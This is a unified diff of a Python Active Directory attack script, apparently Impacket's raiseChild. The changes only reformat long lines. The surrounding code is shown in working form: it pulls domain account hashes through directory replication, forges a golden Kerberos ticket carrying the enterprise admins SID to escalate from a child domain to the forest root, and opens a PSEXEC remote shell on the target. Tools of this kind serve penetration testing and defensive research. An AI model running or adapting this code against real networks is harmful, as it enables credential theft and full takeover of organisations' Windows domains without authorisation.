@@ -411,19 +411,27 @@ class PSEXEC:
             LastDataSent = ''
 
             # Create the pipes threads
-            stdin_pipe  = RemoteStdInPipe(rpctransport,'\%s%s%d' % (RemComSTDIN ,packet['Machine'],packet['ProcessID']), smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, self.__TGS, installService.getShare() )
+            stdin_pipe = RemoteStdInPipe(rpctransport,
+                                         '\%s%s%d' % (RemComSTDIN, packet['Machine'], packet['ProcessID']),
+                                         smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, self.__TGS,
+                                         installService.getShare())
             stdin_pipe.start()
-            stdout_pipe = RemoteStdOutPipe(rpctransport,'\%s%s%d' % (RemComSTDOUT,packet['Machine'],packet['ProcessID']), smb.FILE_READ_DATA )
+            stdout_pipe = RemoteStdOutPipe(rpctransport,
+                                           '\%s%s%d' % (RemComSTDOUT, packet['Machine'], packet['ProcessID']),
+                                           smb.FILE_READ_DATA)
             stdout_pipe.start()
-            stderr_pipe = RemoteStdErrPipe(rpctransport,'\%s%s%d' % (RemComSTDERR,packet['Machine'],packet['ProcessID']), smb.FILE_READ_DATA )
+            stderr_pipe = RemoteStdErrPipe(rpctransport,
+                                           '\%s%s%d' % (RemComSTDERR, packet['Machine'], packet['ProcessID']),
+                                           smb.FILE_READ_DATA)
             stderr_pipe.start()
             
             # And we stay here till the end
             ans = s.readNamedPipe(tid,fid_main,8)
 
             if len(ans):
-               retCode = RemComResponse(ans)
-               logging.info("Process %s finished with ErrorCode: %d, ReturnCode: %d" % (self.__command, retCode['ErrorCode'], retCode['ReturnCode']))
+                retCode = RemComResponse(ans)
+                logging.info("Process %s finished with ErrorCode: %d, ReturnCode: %d" % (
+                self.__command, retCode['ErrorCode'], retCode['ReturnCode']))
             installService.uninstall()
             if self.__copyFile is not None:
                 # We copied a file for execution, let's remove it
@@ -480,7 +488,8 @@ class Pipes(Thread):
         try:
             lock.acquire()
             global dialect
-            self.server = SMBConnection('*SMBSERVER', self.transport.get_smb_connection().getRemoteHost(), sess_port = self.port, preferredDialect = dialect)
+            self.server = SMBConnection('*SMBSERVER', self.transport.get_smb_connection().getRemoteHost(),
+                                        sess_port=self.port, preferredDialect=dialect)
             user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
             self.server.login(user, passwd, domain, lm, nt)
             lock.release()
@@ -552,7 +561,8 @@ class RemoteShell(cmd.Cmd):
         self.intro = '[!] Press help for extra shell commands'
 
     def connect_transferClient(self):
-        self.transferClient = SMBConnection('*SMBSERVER', self.server.getRemoteHost(), sess_port = self.port, preferredDialect = dialect)
+        self.transferClient = SMBConnection('*SMBSERVER', self.server.getRemoteHost(), sess_port=self.port,
+                                            preferredDialect=dialect)
         user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
         self.transferClient.kerberosLogin(user, passwd, domain, lm, nt, aesKey, TGS=self.TGS, useCache=False)
 
@@ -728,7 +738,8 @@ class RAISECHILD:
         rpctransport = transport.DCERPCTransportFactory(stringBinding)
 
         if hasattr(rpctransport, 'set_credentials'):
-            rpctransport.set_credentials(creds['username'],creds['password'], creds['domain'], creds['lmhash'], creds['nthash'], creds['aesKey'])
+            rpctransport.set_credentials(creds['username'], creds['password'], creds['domain'], creds['lmhash'],
+                                         creds['nthash'], creds['aesKey'])
             if self.__doKerberos or creds['aesKey'] is not None:
                 rpctransport.set_kerberos(True)
 
@@ -776,7 +787,8 @@ class RAISECHILD:
         rpctransport = transport.DCERPCTransportFactory(stringBinding)
 
         if hasattr(rpctransport, 'set_credentials'):
-            rpctransport.set_credentials(creds['username'],creds['password'], creds['domain'] , creds['lmhash'], creds['nthash'], creds['aesKey'])
+            rpctransport.set_credentials(creds['username'], creds['password'], creds['domain'], creds['lmhash'],
+                                         creds['nthash'], creds['aesKey'])
             rpctransport.set_kerberos(self.__doKerberos)
 
         dce = rpctransport.get_dce_rpc()
@@ -814,7 +826,8 @@ class RAISECHILD:
                 rpc.set_credentials(creds['username'],'', creds['domain'], TGT=creds['TGT'])
                 rpc.set_kerberos(True)
             else:
-                rpc.set_credentials(creds['username'],creds['password'], creds['domain'], creds['lmhash'], creds['nthash'], creds['aesKey'])
+                rpc.set_credentials(creds['username'], creds['password'], creds['domain'], creds['lmhash'],
+                                    creds['nthash'], creds['aesKey'])
                 rpc.set_kerberos(self.__doKerberos)
         self.__drsr = rpc.get_dce_rpc()
         self.__drsr.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
@@ -827,7 +840,8 @@ class RAISECHILD:
         request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
         drs = drsuapi.DRS_EXTENSIONS_INT()
         drs['cb'] = len(drs) #- 4
-        drs['dwFlags'] = drsuapi.DRS_EXT_GETCHGREQ_V6 | drsuapi.DRS_EXT_GETCHGREPLY_V6 | drsuapi.DRS_EXT_GETCHGREQ_V8 | drsuapi.DRS_EXT_STRONG_ENCRYPTION
+        drs['dwFlags'] = drsuapi.DRS_EXT_GETCHGREQ_V6 | drsuapi.DRS_EXT_GETCHGREPLY_V6 | drsuapi.DRS_EXT_GETCHGREQ_V8 |\
+                         drsuapi.DRS_EXT_STRONG_ENCRYPTION
         drs['SiteObjGuid'] = drsuapi.NULLGUID
         drs['Pid'] = 0
         drs['dwReplEpoch'] = 0
@@ -1015,14 +1029,17 @@ class RAISECHILD:
 
             if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
                 if crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'] == 0:
-                    userRecord = self.DRSGetNCChanges(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1], creds)
-                    #userRecord.dump()
+                    userRecord = self.DRSGetNCChanges(
+                        crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1], creds)
+                    # userRecord.dump()
                     if userRecord['pmsgOut']['V6']['cNumObjects'] == 0:
                         raise Exception('DRSGetNCChanges didn\'t return any object!')
                 else:
-                    raise Exception('DRSCrackNames status returned error 0x%x' % crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'])
+                    raise Exception('DRSCrackNames status returned error 0x%x' %
+                                    crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'])
             else:
-                raise Exception('DRSCrackNames returned %d items for user %s' %(crackedName['pmsgOut']['V1']['pResult']['cItems'], userName))
+                raise Exception('DRSCrackNames returned %d items for user %s' % (
+                crackedName['pmsgOut']['V1']['pResult']['cItems'], userName))
 
             rid, lmhash, nthash = self.__decryptHash(userRecord, userRecord['pmsgOut']['V6']['PrefixTableSrc']['pPrefixEntry'])
             aesKey = self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut']['V6']['PrefixTableSrc']['pPrefixEntry'])
@@ -1204,7 +1221,9 @@ class RAISECHILD:
         #offsetData = (offsetData+privSvrChecksumIB['cbBufferSize'] + 7) /8 *8
 
         # Building the PAC_TYPE as specified in [MS-PAC]
-        buffers = str(validationInfoIB) + str(pacClientInfoIB) + str(serverChecksumIB) + str(privSvrChecksumIB) + validationInfoBlob + validationInfoAlignment + str(pacInfos[PAC_CLIENT_INFO_TYPE]) + pacClientInfoAlignment
+        buffers = str(validationInfoIB) + str(pacClientInfoIB) + str(serverChecksumIB) + str(
+            privSvrChecksumIB) + validationInfoBlob + validationInfoAlignment + str(
+            pacInfos[PAC_CLIENT_INFO_TYPE]) + pacClientInfoAlignment
         buffersTail = str(serverChecksum) + serverChecksumAlignment + str(privSvrChecksum) + privSvrChecksumAlignment
 
         pacType = PACTYPE()
@@ -1285,7 +1304,9 @@ class RAISECHILD:
         TGS = {}
         while True:
             try:
-                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, childCreds['password'], childCreds['domain'], childCreds['lmhash'], childCreds['nthash'], None, self.__kdcHost)
+                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, childCreds['password'],
+                                                                        childCreds['domain'], childCreds['lmhash'],
+                                                                        childCreds['nthash'], None, self.__kdcHost)
             except KerberosError, e:
                 if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                     # We might face this if the target does not support AES (most probably
@@ -1303,7 +1324,8 @@ class RAISECHILD:
                     raise
 
             # We have a TGT, let's make it golden
-            goldenTicket, cipher, sessionKey = self.makeGolden(tgt, cipher, sessionKey, credentials['nthash'], credentials['aesKey'], entepriseSid+'-519')
+            goldenTicket, cipher, sessionKey = self.makeGolden(tgt, cipher, sessionKey, credentials['nthash'],
+                                                               credentials['aesKey'], entepriseSid + '-519')
             TGT['KDC_REP'] = goldenTicket
             TGT['cipher'] = cipher
             TGT['oldSessionKey'] = oldSessionKey
@@ -1311,12 +1333,16 @@ class RAISECHILD:
 
             # We've done what we wanted, now let's call the regular getKerberosTGS to get a new ticket for cifs
             if self.__target is None:
-                serverName = Principal('cifs/%s' % self.getMachineName(gethostbyname(parentName)), type=constants.PrincipalNameType.NT_SRV_INST.value)
+                serverName = Principal('cifs/%s' % self.getMachineName(gethostbyname(parentName)),
+                                       type=constants.PrincipalNameType.NT_SRV_INST.value)
             else:
                 serverName = Principal('cifs/%s' % self.__target, type=constants.PrincipalNameType.NT_SRV_INST.value)
             try:
                 logging.debug('Getting TGS for SPN %s' % serverName)
-                tgsCIFS, cipherCIFS, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(serverName, childCreds['domain'], None, goldenTicket, cipher, sessionKey)
+                tgsCIFS, cipherCIFS, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(serverName,
+                                                                                        childCreds['domain'], None,
+                                                                                        goldenTicket, cipher,
+                                                                                        sessionKey)
                 TGS['KDC_REP'] = tgsCIFS
                 TGS['cipher'] = cipherCIFS
                 TGS['oldSessionKey'] = oldSessionKeyCIFS
@@ -1386,7 +1412,8 @@ class RAISECHILD:
             logging.info('Opening PSEXEC shell at %s' % self.__target)
             from impacket.smbconnection import SMBConnection
             s = SMBConnection('*SMBSERVER', self.__target)
-            s.kerberosLogin(adminCreds['username'], '', adminCreds['domain'], adminCreds['lmhash'], adminCreds['nthash'], useCache=False)
+            s.kerberosLogin(adminCreds['username'], '', adminCreds['domain'], adminCreds['lmhash'],
+                            adminCreds['nthash'], useCache=False)
 
             if self.__command != 'None':
                 executer = PSEXEC(self.__command, adminCreds['username'], adminCreds['domain'], s, None, None)
@@ -1433,8 +1460,9 @@ if __name__ == '__main__':
     import re
     # This is because I'm lazy with regex
     # ToDo: We need to change the regex to fullfil domain/username[:password]
-    targetParam = options.target+'@'
-    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(targetParam).groups('')
+    targetParam = options.target + '@'
+    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
+        targetParam).groups('')
 
     #In case the password contains '@'
     if '@' in address:
